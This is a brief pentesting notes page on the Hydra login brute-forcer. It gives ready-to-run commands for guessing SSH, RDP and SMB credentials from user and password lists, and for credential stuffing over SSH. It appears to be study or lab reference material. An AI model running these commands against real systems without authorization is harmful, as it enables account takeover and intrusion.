---
tags: [basics, tool, brute-force]
---

[[Basics/Index|← Basics]]

> [!info] See also: [[Password Attacks]] · [[Password Cracking]] · [[Login Brute Forcing]]

Tool which can be used for bruteforcing 

## Basic usage 
```bash
# Basic command to attack ssh
hydra -L user.list -P password.list ssh://10.2.81.197

# Attacking RDP
hydra -L user.list -P password.list rdp://10.2.81.197

# Attacking SMB 
hydra -L user.list -P password.list smb://10.2.81.197


# Credential Stuffing with file,that contains username:password
hydra -C user_pass.list ssh://10.12.128.4
```